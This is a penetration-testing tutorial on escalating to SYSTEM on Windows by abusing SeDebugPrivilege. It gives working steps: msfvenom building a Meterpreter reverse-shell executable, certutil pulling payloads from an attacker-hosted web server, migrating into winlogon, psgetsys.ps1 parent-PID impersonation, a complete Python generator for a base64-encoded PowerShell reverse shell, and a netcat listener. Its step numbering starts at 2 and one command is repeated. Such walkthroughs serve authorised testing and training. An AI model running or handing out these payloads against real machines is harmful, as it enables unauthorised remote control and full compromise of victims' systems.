---
legal-banner: true
---

### **INTRODUCTION**

In 2008 blog post on devblogs.microsoft.com has the title “If you grant somebody SeDebugPrivilege, you gave away the farm”. Basically, because a user with that privilege can debug any process (including those running as system), they can inject code into those processes and run whatever they want as that user.

### **SEDEBUGPRIVILEGE VIA METERPRETER MIGRATE**

2.  Generate the Payload:  
    `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP-ADRESS] LPORT=9001 -f exe -o rev.exe`  
    
    ![](../../../img/Windows-Environment/135.png)

    **NOTE:** Host the Payload Using Python `python -m http.server 80`
    
3.  Transfer the binary to the target machine using certutil  
    `certutil -urlcache -f http://[IP-ADRESS]:80/rev.exe rev.exe`  
    
    ![](../../../img/Windows-Environment/136.png)
    
4.  Set Up Handler:  
    `msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 9001; run"`  
    
    ![](../../../img/Windows-Environment/137.png)
    
5.  Execute the Payload:  
    `.\rev.exe`  
    
    ![](../../../img/Windows-Environment/138.png)
    
6.  Find a SYSTEM Process (e.g., winlogon.exe):  
    `ps winlogon`  
    
    ![](../../../img/Windows-Environment/139.png)

    **NOTE:** Don't forget to note the PID of the winlogon.exe process
    
7.  Migrate to the SYSTEM Process and Open a System Shell with Meterpreter  
    `migrate [PID]` , `shell`  
    
    ![](../../../img/Windows-Environment/140.png)
    

### **SEDEBUGPRIVILEGE VIA PSGETSYS.PS1**

1.  Download psgetsys.ps1 Script  
    `wget https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1`  
    
    ![](../../../img/Windows-Environment/141.png)

    **NOTE:** Host the Payload Using Python `python -m http.server 80`
    
2.  Transfer and Import psgetsys.ps1 Script  
    `certutil -urlcache -f http://[IP-ADRESS]:80/psgetsys.ps1 psgetsys.ps1`  
    
    ![](../../../img/Windows-Environment/142.png)

    **NOTE:** After downloading, import the script `Import-Module .\psgetsys.ps1`
    
3.  Identify a SYSTEM Process (e.g., winlogon.exe PID 548).  
    `(Get-WmiObject Win32_Process -Filter "Name='winlogon.exe'").ProcessId`
    
4.  Generate base64 Powershell reverse Shell with python script
    
    ```PYTHON
    #!/usr/bin/env python3
    
    import sys
    import base64
    
    def help():
        print("USAGE: %s IP PORT" % sys.argv[0])
        print("Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT")
        exit()
    
    try:
        (ip, port) = (sys.argv[1], int(sys.argv[2]))
    except:
        help()
    
    
    payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    payload = payload % (ip, port)
    
    cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
    
    print(cmdline)
    ```
    
5.  Run python script  
    `python3 revshell.py 10.11.92.52 9002`  
    
    ![](../../../img/Windows-Environment/143.png)
    
6.  Impersonate and Execute Another Command with SYSTEM Privileges:  
    `ImpersonateFromParentPid -ppid 548 -command "c:\windows\system32\cmd.exe" -cmdargs "/c powershell -e [BASE64-ENCODED-COMMAND]"`
    
7.  If you encounter error 122- ERROR_INSUFFICIENT_BUFFER, it indicates the command buffer is too small. Use shorter commands or split the payload into smaller parts:  
    `ImpersonateFromParentPid -ppid 548 -command "c:\windows\system32\cmd.exe" -cmdargs "/c ping [IP-ADRESS]"`
    
8.  Run the psgetsys.ps1 Script and Use ImpersonateFromParentPid to Gain SYSTEM Privileges:  
    `ImpersonateFromParentPid -ppid 548 -command "c:\windows\system32\cmd.exe" -cmdargs "/c powershell -e [BASE64-ENCODED-COMMAND]"`
    
9.  Use a Netcat Listener to Catch the Shell :  
    `rlwrap -cAr nc -lnvp 9002`